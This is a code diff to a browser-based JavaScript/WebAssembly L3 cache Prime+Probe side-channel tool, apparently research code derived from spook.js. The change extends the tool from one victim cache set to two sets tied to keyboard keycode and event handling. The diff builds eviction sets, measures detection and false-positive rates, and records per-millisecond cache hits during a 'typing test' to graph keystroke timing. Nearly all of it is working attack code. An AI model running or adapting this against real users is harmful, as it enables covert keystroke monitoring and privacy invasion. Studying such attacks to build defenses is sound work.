@@ -578,15 +578,17 @@ function check_find_all_slices(evset, num_slices){
     }
 }
 
-const TARGET_SET = 249;
+const KBD_KEYCODE_SET = 366;
+const KBD_EVENT_SET = 413;
 const LINE_SIZE = 64;
-const VICTIM = 249*64;
+const KBD_KEYCODE_VICTIM = KBD_KEYCODE_SET*LINE_SIZE;
+const KBD_EVENT_VICTIM = KBD_EVENT_SET*LINE_SIZE;
 const NUM_SETS_PER_SLICE = 2048;
 const NUM_SLICES = 4;
 const THRESHOLD = 60;
 
 // code adopted from create_spook_js in spook.js 
-async function l3pp_main(options){ 
+async function l3pp_main(){ 
     const {module, memory} = await getAccessModules();
     const instance = new WebAssembly.Instance(module, {env: {mem: memory}});
     const buffer = new Uint32Array(memory.buffer);
@@ -599,20 +601,24 @@ async function l3pp_main(options){
     await startTimer();
 
     // Build eviction sets
+    
+
     self.importScripts('evsets/main.js');
     
+    // -----------------------------------------------------------------------------------------------
+
     let count = 0;
-    let found_sets = [];
-    let candidate_set = [];
-    let victims = []
+    let keycode_found_sets = [];
+    let keycode_candidate_set = [];
+    let keycode_victims = [];
     
-    for(let i = VICTIM; i < 128 * 1024 * 1024; i += NUM_SETS_PER_SLICE * LINE_SIZE){
+    for(let i = KBD_KEYCODE_VICTIM; i < 128 * 1024 * 1024; i += NUM_SETS_PER_SLICE * LINE_SIZE){
         if(count < 32){
-            victims.push(i);
+            keycode_victims.push(i);
             count++;
             continue;
         } 
-        candidate_set.push(i);
+        keycode_candidate_set.push(i);
     }
 
     let num_sets = 0;
@@ -620,39 +626,87 @@ async function l3pp_main(options){
     
     /* out-of-bounds evset search algorithm */
     while(num_sets < NUM_SLICES){
-        let victim = victims[victim_index]
+        let victim = keycode_victims[victim_index]
         let already_found = false;
-        for(let evset of found_sets){
+        for(let evset of keycode_found_sets){
             if(evset.evict_reload(victim, 100)){
                 already_found = true;
             } 
         }  
         if(!already_found){
             let set = await build_evset({
-                offset: options.offset ?? 63,
+                offset: (KBD_KEYCODE_VICTIM - Math.floor(KBD_KEYCODE_VICTIM/4096) * 4096)/64,
                 module: module,
                 memory: memory,
-                victim: VICTIM,
-                candidate_set: candidate_set
+                victim: KBD_KEYCODE_VICTIM,
+                candidate_set: keycode_candidate_set
             });
-            found_sets.push(new EvictionListL3(buffer, Array.from(set[0])))
+            keycode_found_sets.push(new EvictionListL3(buffer, Array.from(set[0])))
             num_sets++;
         }
 
         victim_index++;
     }
+    log("kbd_keycode")
+    log(keycode_found_sets)
+
+    // ----------------------------------------------------------------------------------------------------------
     
+    count = 0;
+    let event_found_sets = [];
+    let event_candidate_set = [];
+    let event_victims = [];
+    
+    for(let i = KBD_EVENT_VICTIM; i < 128 * 1024 * 1024; i += NUM_SETS_PER_SLICE * LINE_SIZE){
+        if(count < 32){
+            event_victims.push(i);
+            count++;
+            continue;
+        } 
+        event_candidate_set.push(i);
+    }
+
+    num_sets = 0;
+    victim_index = 0;
+    
+    /* out-of-bounds evset search algorithm */
+    while(num_sets < NUM_SLICES){
+        let victim = event_victims[victim_index]
+        let already_found = false;
+        for(let evset of event_found_sets){
+            if(evset.evict_reload(victim, 100)){
+                already_found = true;
+            } 
+        }  
+        if(!already_found){
+            let set = await build_evset({
+                offset: (KBD_EVENT_VICTIM - Math.floor(KBD_EVENT_VICTIM/4096) * 4096)/64,
+                module: module,
+                memory: memory,
+                victim: KBD_EVENT_VICTIM,
+                candidate_set: event_candidate_set
+            });
+            event_found_sets.push(new EvictionListL3(buffer, Array.from(set[4])))
+            num_sets++;
+        }
+        victim_index++;
+    }
+    log("kbd_event")
+    log(event_found_sets)
+
+    //------------------------------------------------------------------------------------------------------
+
     /* local transmission test */
-    let evset = found_sets[0];
+    let evset = keycode_found_sets[0];
 
     const TRIALS = 250, WARMUP_ROUNDS = 100, THRESHOLD = 60;
-    ipdft_out = intra_process_detection_fp_test(evset, buffer, WARMUP_ROUNDS, TRIALS, VICTIM);
+    ipdft_out = intra_process_detection_fp_test(evset, buffer, WARMUP_ROUNDS, TRIALS, KBD_KEYCODE_VICTIM);
     log("detection-rate: " + ipdft_out[0]);
     log("false-positive-rate: " + ipdft_out[1]);
 
     /* compute detection rate */
     const TRANSMIT_ROUNDS_SIDE = 256
-    intra_process_transmission_test(evset, buffer, WARMUP_ROUNDS, TRANSMIT_ROUNDS_SIDE, VICTIM);
+    intra_process_transmission_test(evset, buffer, WARMUP_ROUNDS, TRANSMIT_ROUNDS_SIDE, KBD_KEYCODE_VICTIM);
     
     /* typing test begins */
     log("typing test begins now")
@@ -663,26 +717,33 @@ async function l3pp_main(options){
 
     const KEYSTROKE_BUFFER_SIZE = 1024 * 1024;
     const NUM_MEASUREMENTS_MS = 1024;
-    const TARGET_SLICE = 3
+    const KEYCODE_SLICE = 3
+    const EVENT_SLICE = 3
 
-    let hit_count_per_ms = new Uint16Array(8 * KEYSTROKE_BUFFER_SIZE / NUM_MEASUREMENTS_MS) 
+    let keycode_hit_count_per_ms = new Uint16Array(8 * KEYSTROKE_BUFFER_SIZE / NUM_MEASUREMENTS_MS) 
+    let event_hit_count_per_ms = new Uint16Array(8 * KEYSTROKE_BUFFER_SIZE / NUM_MEASUREMENTS_MS) 
+    let keycode_traces = new Uint8Array(KEYSTROKE_BUFFER_SIZE)
+    let event_traces = new Uint8Array(KEYSTROKE_BUFFER_SIZE)
 
-    let traces = new Uint8Array(KEYSTROKE_BUFFER_SIZE)
-
-    hit_count_per_ms.fill(0);
-    traces.fill(0);
+    keycode_hit_count_per_ms.fill(0);
+    keycode_traces.fill(0);
+    event_hit_count_per_ms.fill(0);
+    event_traces.fill(0);
 
     let num_traces = 0;
     
     /* warm up all sets for the test */
     for(let i = 0; i < 10; i++){
-        found_sets[TARGET_SLICE].probe()
+        keycode_found_sets[KEYCODE_SLICE].probe()
+        event_found_sets[EVENT_SLICE].probe()
     } 
 
     while(num_traces < KEYSTROKE_BUFFER_SIZE){
         for(let i = 0; i < 8; i++){
-            let result = found_sets[TARGET_SLICE].probe();
-            traces[num_traces] += (result << i); 
+            let keycode_result = keycode_found_sets[KEYCODE_SLICE].probe();
+            let event_result = event_found_sets[EVENT_SLICE].probe(); 
+            keycode_traces[num_traces] += (keycode_result << i); 
+            event_traces[num_traces] += (event_result << i); 
         }
         num_traces++;
     }
@@ -694,19 +755,23 @@ async function l3pp_main(options){
 
     for(let i = 0; i < 8 * KEYSTROKE_BUFFER_SIZE / NUM_MEASUREMENTS_MS; i++){
         for(let j = 0; j < NUM_MEASUREMENTS_MS / 8; j++){
-            let data = traces[i * NUM_MEASUREMENTS_MS / 8 + j];
+            let keycode_data = keycode_traces[i * NUM_MEASUREMENTS_MS / 8 + j];
+            let event_data = event_traces[i * NUM_MEASUREMENTS_MS / 8 + j];
             for(let l = 0; l < 8; l++){
-                let result = data & 1;
-                hit_count_per_ms[i] += result;
-                data >>= 1;
+                let keycode_result = keycode_data & 1;
+                let event_result = event_data & 1;
+                keycode_hit_count_per_ms[i] += keycode_result;
+                event_hit_count_per_ms[i] += event_result;
+                keycode_data >>= 1;
+                event_data >>= 1;
             }
         }
     }
 
-    await graphKeystrokes({"data": hit_count_per_ms, "pp_duration": hit_count_per_ms.length, "js_duration": duration, "start_time": start_measurement});
+    await graphKeystrokes({"keycode_data": keycode_hit_count_per_ms, "event_data": event_hit_count_per_ms, "pp_duration": keycode_hit_count_per_ms.length, "js_duration": duration, "start_time": start_measurement});
 
     // remote_set_profiling(evset);
     await stopTimer();
 }
 
-l3pp_main({offset:(VICTIM - Math.floor(VICTIM/4096) * 4096)/64, victim: VICTIM})
+l3pp_main()
